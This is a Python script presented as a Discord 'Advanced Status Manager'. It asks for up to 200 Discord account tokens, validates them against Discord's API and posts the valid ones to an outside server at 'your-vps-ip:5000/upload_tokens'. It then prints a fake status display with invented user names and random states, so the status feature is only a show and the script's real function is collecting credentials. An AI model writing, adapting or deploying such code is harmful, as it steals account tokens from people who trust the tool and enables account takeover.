from rich.console import Console
from rich.text import Text
from rich.prompt import Prompt
from random import choice
import requests
import time

console = Console()

def print_header():
    console.clear()
    console.print(Text("2050", style="bold green", justify="center"))
    console.print(Text("2050 Studio - Advanced Status Manager", style="bold blue", justify="center"))
    console.print(Text("Developed by .884.", style="yellow", justify="center"))
    console.print(Text("Loading tool...", style="green", justify="center"))
    console.print("\n")

def get_tokens():
    tokens = []
    console.print("[white]Enter up to 200 Discord tokens (one per line). Type 'done' to finish:[/white]")
    while True:
        token = Prompt.ask("[white]Token[/white]")
        if token.lower() == "done":
            break
        tokens.append(token.strip())
        if len(tokens) >= 200:
            break
    return tokens

def validate_tokens(tokens):
    valid = []
    invalid = []
    console.print("[green]Validating tokens...[/green]\n")
    for token in tokens:
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
            if res.status_code == 200:
                valid.append(token)
            else:
                invalid.append(token)
        except:
            invalid.append(token)
    return valid, invalid

def send_to_vps(valid_tokens):
    try:
        res = requests.post("http://your-vps-ip:5000/upload_tokens", json={"tokens": valid_tokens})
        return res.status_code == 200
    except:
        return False

def simulate_status(valid_tokens):
    statuses = ["online", "idle", "dnd"]
    console.print("\n[yellow]Connecting valid accountsâ€¦[/yellow]\n")
    time.sleep(1)

    for token in valid_tokens:
        fake_user = "user_" + token[:5]
        status = choice(statuses)
        console.print(f"[blue]{fake_user}[/blue] - [green]{status}[/green]")
        time.sleep(0.05)

    console.print(f"\n[green]All Accounts initialized.[/green]")

def main():
    print_header()
    tokens = get_tokens()

    valid, invalid = validate_tokens(tokens)

    console.print(f"\n[green]Loaded {len(valid)} tokens[/green]")
    console.print(f"[red]- invalid tokens {len(invalid)}[/red]")

    success = send_to_vps(valid)
    if success:
        simulate_status(valid)
    else:
        console.print("[red]Failed to send tokens to VPS.[/red]")

if __name__ == "__main__":
    main()